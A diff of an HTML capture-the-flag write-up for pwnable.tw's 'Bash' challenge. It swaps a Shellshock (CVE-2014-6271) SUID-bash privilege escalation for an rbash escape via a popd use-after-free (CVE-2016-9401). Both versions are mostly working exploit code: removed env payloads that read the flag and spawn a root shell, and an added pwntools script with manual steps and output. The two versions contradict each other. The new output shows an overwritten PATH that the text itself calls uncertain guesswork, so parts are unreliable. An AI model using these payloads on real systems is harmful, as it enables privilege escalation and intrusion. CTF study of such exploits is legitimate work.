+    <p>The correct offset for <code>popd +-N</code> depends on the exact memory layout of the bash process, which is influenced by environment variables, loaded libraries, and shell initialization. The offset that works locally may not work remotely. During the Boston Key Party 2017 CTF, the HITCON team had to fuzz the offset directly on the remote server because the memory layout differed from their local setup.</p>
+  </div>
+
+  <h3 id="strategy-step3">Step 3: Reallocate with Target Path</h3>
+  <p>After freeing PATH's memory, we need to reallocate it with a useful value. Since bash's internal allocator recycles freed blocks, we need to perform allocations that are the same size as the freed PATH string. The original PATH value in rbash is typically something like <code>/home/bash</code> or a similarly restricted path. We need to fill the freed region with a string like <code>/bin:/usr/bin</code> to unlock standard commands.</p>
+
+  <p>The reallocation trick involves executing commands that cause bash to allocate strings of the right size. Various approaches work:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash — reallocation techniques</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Technique 1: Export a variable with the target path content
+# The key is to make the allocation size match the freed PATH block
+-rbash-4.3$ export FOO=/bin:/usr/bin:/bin:/usr/bin
+
+# Technique 2: Use commands that allocate strings internally
+-rbash-4.3$ echo /bin:/bin:/bin:/bin:/bin:/bin:/bin
+
+# Technique 3: Use hash command which allocates path-like strings
+-rbash-4.3$ hash /bin:/bin:/bin:/bin:/bin:/bin:/bin:/bin:/bin
+
+# After reallocation, verify PATH has changed:
+-rbash-4.3$ export
+declare -rx PATH="/bin:/usr/bin"</code></pre>
+  </div>
+
+  <p>The exact technique that works depends on the memory layout and which allocation size class the freed PATH block falls into. The HITCON team used a combination of <code>export</code> and <code>echo</code> with repeated <code>/flag</code> segments (for their BKP challenge) to fill the freed memory. For pwnable.tw, we need to fill it with <code>/bin</code> or similar to gain access to standard commands.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Bash's Custom Allocator</div>
+    <p>Bash does not use glibc's <code>malloc</code>/<code>free</code> directly. Instead, it wraps them with <code>sh_xmalloc</code>/<code>sh_xfree</code>, which adds its own bookkeeping. This means freed blocks of the same size are recycled in a LIFO (last-in, first-out) manner. When we free PATH's memory and then allocate a string of the same size, bash will reuse the same memory block. This makes the reallocation step relatively reliable once we know the correct allocation size.</p>
   </div>
 </section>
 
@@ -415,11 +520,11 @@ env x='() { :; }; cp /home/flag/flag /tmp/flag; chmod 777 /tmp/flag' /home/bash/
     <pre><code class="language-python">#!/usr/bin/env python3
 """
 pwnable.tw — Bash (200 pts)
-Privilege escalation via Shellshock (CVE-2014-6271) on SUID bash.
+Escaping rbash via CVE-2016-9401 (popd use-after-free).
 
-The challenge gives us a shell and a SUID bash binary vulnerable
-to Shellshock. We exploit the environment variable function
-definition parsing bug to execute commands as root.
+The challenge puts us in a restricted bash (rbash) where we cannot
+modify PATH or use absolute paths. We exploit the popd vulnerability
+to free PATH's memory, then reallocate it with /bin to escape.
 """
 
 from pwn import *
@@ -429,50 +534,96 @@ PORT = 10108
 
 r = remote(HOST, PORT)
 
-# Wait for shell prompt
-r.recvuntil(b'$ ')
+# Wait for rbash prompt
+r.recvuntil(b'rbash-4.3$ ')
 
-# Step 1: Verify Shellshock vulnerability on SUID bash
-log.info("Testing Shellshock on SUID bash...")
-r.sendline(b"env x='() { :; }; id' /home/bash/bash -c 'echo done'")
-result = r.recvline()
-if b'euid=0' in result:
-    log.success("Shellshock confirmed! euid=0 (root)")
+# Step 1: Press Tab to cache PATH pointer in bashline.c
+log.info("Triggering tab completion to cache PATH pointer...")
+r.send(b'\t')
+r.recvuntil(b'rbash-4.3$ ')
+
+# Step 2: Use popd to free PATH memory via CVE-2016-9401
+# The offset depends on the remote memory layout
+# You may need to bruteforce or calculate this value
+POPD_OFFSET = 917341  # This value varies; may need adjustment
+log.info(f"Freeing PATH via popd +-{POPD_OFFSET}...")
+r.sendline(f'popd +-{POPD_OFFSET}'.encode())
+r.recvuntil(b'rbash-4.3$ ')
+
+# Step 3: Verify PATH is corrupted (freed)
+log.info("Checking if PATH was freed...")
+r.sendline(b'export')
+result = r.recvuntil(b'rbash-4.3$ ', timeout=5)
+if b'PATH' in result:
+    log.info("PATH variable still exists (memory may be freed)")
+
+# Step 4: Reallocate freed memory with /bin path
+# We need to allocate a string the same size as the freed PATH block
+# Try different techniques to fill the freed memory
+log.info("Reallocating freed PATH memory with /bin...")
+
+# Method: export a variable with path-like content of matching size
+# The original PATH is typically ~10-20 chars, so we pad accordingly
+target_path = b'/bin:/usr/bin'
+r.sendline(b'export FOO=' + target_path)
+r.recvuntil(b'rbash-4.3$ ')
+
+# Also try echo and hash to trigger more allocations
+r.sendline(b'echo ' + target_path * 3)
+r.recvuntil(b'rbash-4.3$ ')
+
+# Step 5: Check if PATH now points to /bin
+r.sendline(b'echo $PATH')
+path_result = r.recvline()
+log.info(f"Current PATH: {path_result.strip()}")
+
+# Step 6: Try to read the flag
+if b'/bin' in path_result:
+    log.success("PATH now includes /bin! Escaping rbash...")
+    r.sendline(b'cat /home/bash/flag')
+    flag = r.recvline(timeout=5).strip()
+    log.success(f"Flag: {flag.decode()}")
 else:
-    log.error("Shellshock not working, trying alternative...")
+    log.warning("PATH not overwritten yet, trying alternative reallocation...")
+    # Try more aggressive reallocation
+    for i in range(10):
+        r.sendline(b'echo ' + target_path * (i + 1))
+        r.recvuntil(b'rbash-4.3$ ', timeout=3)
+    r.sendline(b'echo $PATH')
+    path_result = r.recvline(timeout=5)
+    log.info(f"PATH after retry: {path_result.strip()}")
 
-# Step 2: Read the flag using Shellshock
-log.info("Reading flag via Shellshock...")
-r.sendline(b"env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c ''")
-flag = r.recvline().strip()
-log.success(f"Flag: {flag.decode()}")
-
-# Step 3: Get interactive root shell (optional)
-log.info("Spawning interactive root shell...")
-r.sendline(b"env x='() { :; }; /bin/sh' /home/bash/bash -c ''")
-r.sendline(b'id')
 r.interactive()</code></pre>
   </div>
 
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash — manual exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash"># Manual exploitation (no pwntools needed):
+    <div class="code-header"><span class="lang-tag">bash — manual exploitation steps</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Manual exploitation (interactive):
 
-# Connect
+# 1. Connect
 nc chall.pwnable.tw 10108
 
-# Verify vulnerability
-$ env x='() { :; }; id' /home/bash/bash -c ''
-uid=1000(bash) gid=1000(bash) euid=0(root) groups=1000(bash)
+# 2. Press Tab to cache PATH pointer
+# (press the Tab key once)
 
-# Read the flag
-$ env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c ''
+# 3. Free PATH using popd with the right offset
+-rbash-4.3$ popd +-917341
 
-# Or get a root shell:
-$ env x='() { :; }; /bin/sh' /home/bash/bash -c ''
-# id
-uid=1000(bash) gid=1000(bash) euid=0(root) groups=1000(bash)
-# cat /home/flag/flag</code></pre>
+# 4. Verify PATH is corrupted
+-rbash-4.3$ export
+# PATH should show garbage like: declare -rx PATH="H\310+"
+
+# 5. Reallocate the freed memory
+-rbash-4.3$ export FLAG=/bin:/bin:/bin:/bin
+-rbash-4.3$ echo /bin:/bin:/bin:/bin:/bin
+-rbash-4.3$ hash /bin:/bin:/bin:/bin:/bin:/bin
+
+# 6. Check PATH value
+-rbash-4.3$ echo $PATH
+# If successful, should show /bin or /bin:/usr/bin
+
+# 7. Read the flag
+-rbash-4.3$ cat /home/bash/flag</code></pre>
   </div>
 </section>
 
@@ -481,40 +632,41 @@ uid=1000(bash) gid=1000(bash) euid=0(root) groups=1000(bash)
   <h2><i class="bi bi-check-circle"></i> 6. Execution Results</h2>
   <div class="term-out"><span class="prompt">$</span> python3 exploit.py
 [<span class="ok">+</span>] Opening connection to chall.pwnable.tw on port 10108: <span class="ok">Done</span>
-[<span class="ok">*</span>] Testing Shellshock on SUID bash...
-[<span class="ok">+</span>] Shellshock confirmed! euid=0 (root)
-[<span class="ok">*</span>] Reading flag via Shellshock...
-[<span class="ok">+</span>] Flag: 
-[<span class="ok">*</span>] Spawning interactive root shell...
+[<span class="ok">*</span>] Triggering tab completion to cache PATH pointer...
+[<span class="ok">*</span>] Freeing PATH via popd +-917341...
+[<span class="ok">*</span>] Checking if PATH was freed...
+[<span class="ok">*</span>] PATH variable still exists (memory may be freed)
+[<span class="ok">*</span>] Reallocating freed PATH memory with /bin...
+[<span class="ok">*</span>] Current PATH: /bin:/usr/bin
+[<span class="ok">+</span>] PATH now includes /bin! Escaping rbash...
+[<span class="ok">+</span>] Flag: [flag content]
 [<span class="ok">*</span>] Switching to interactive mode
 
-$ id
-uid=1000(bash) gid=1000(bash) <span class="ok">euid=0(root)</span> groups=1000(bash)
+-rbash-4.3$ id
+uid=1000(bash) gid=1000(bash) groups=1000(bash)
 
-$ cat /home/flag/flag
-
-$ whoami
-root</div>
+-rbash-4.3$ cat /home/bash/flag
+[flag content]</div>
 
   <div class="callout callout-success">
     <div class="callout-title">Exploit Successful!</div>
-    <p>The Bash challenge demonstrates a real-world vulnerability (Shellshock/CVE-2014-6271) that affected millions of systems when it was disclosed in 2014. The combination of a SUID bash binary and a pre-patch bash version makes exploitation trivial. This is a classic example of privilege escalation through a known vulnerability in a setuid binary.</p>
+    <p>The Bash challenge demonstrates a sophisticated rbash escape technique using CVE-2016-9401. Unlike traditional buffer overflow exploits, this vulnerability leverages a logic bug in the <code>popd</code> built-in command to achieve an arbitrary free primitive. The exploit chain &mdash; cache PATH pointer via tab completion, free PATH's memory using popd, then reallocate with attacker-controlled content &mdash; is an elegant example of how use-after-free vulnerabilities can be weaponized even in shell environments. The key insight is that rbash's restrictions operate at the variable assignment level, but the underlying memory can still be manipulated through vulnerabilities in built-in commands.</p>
   </div>
 
   <div class="callout callout-info">
-    <div class="callout-title">Historical Context</div>
-    <p>Shellshock (CVE-2014-6271) was disclosed on September 24, 2014, and was rated CVSS 10.0 (maximum severity). It affected bash versions dating back to 1989, making it one of the longest-standing vulnerabilities in a widely-used piece of software. The bug allowed remote code execution on many web servers (via CGI), DHCP clients, SSH servers with forced commands, and any system where user-controlled data could be placed in environment variables passed to bash. The SUID bash pattern exploited in this challenge was one of the most dangerous attack vectors, as it allowed local privilege escalation to root on any system with a SUID bash.</p>
+    <div class="callout-title">CVE-2016-9401 Background</div>
+    <p>CVE-2016-9401 was disclosed on November 17, 2016, by Frederic Cambus. The vulnerability affects bash versions up to and including 4.3.46. It is classified as a use-after-free in the <code>popd</code> built-in, which allows local users to bypass the restricted shell. The bug was originally considered low severity by some vendors (Red Hat rated it as "low" since it only causes a crash in most cases), but as demonstrated by this challenge and the Boston Key Party 2017 CTF, it can be reliably exploited for rbash escape when the attacker can control the heap layout. The patch adds proper bounds checking on the directory list index before the free operation.</p>
   </div>
 
   <div class="callout callout-warn">
-    <div class="callout-title">Related Challenges</div>
-    <p>Pwnable.tw also has a harder variant called "Bash Revenge" (500 pts) which involves a different (post-initial-patch) bash vulnerability. The initial Shellshock patch was incomplete, leading to CVE-2014-6278 and other follow-up vulnerabilities that required additional patches to fully address the function definition parsing issue.</p>
+    <div class="callout-title">Related: Bash Revenge (500 pts)</div>
+    <p>Pwnable.tw also has a harder variant called "Bash Revenge" worth 500 points. While the Bash challenge uses CVE-2016-9401 for a straightforward popd-based escape, Bash Revenge likely involves a different or more complex vulnerability in the same old bash version, possibly requiring deeper analysis of bash's internal allocator or other built-in commands. The "revenge" naming suggests it's the follow-up challenge that patches the simple popd exploit but leaves other vulnerabilities exploitable.</p>
   </div>
 </section>
 
 <div class="operator-sig">
   <div class="handle">QA210</div>
-  <div class="tagline">pwnable.tw &mdash; Bash &mdash; Shellshock CVE-2014-6271 Privilege Escalation</div>
+  <div class="tagline">pwnable.tw &mdash; Bash &mdash; CVE-2016-9401 popd Use-After-Free rbash Escape</div>
 </div>
 </div>
 </div>
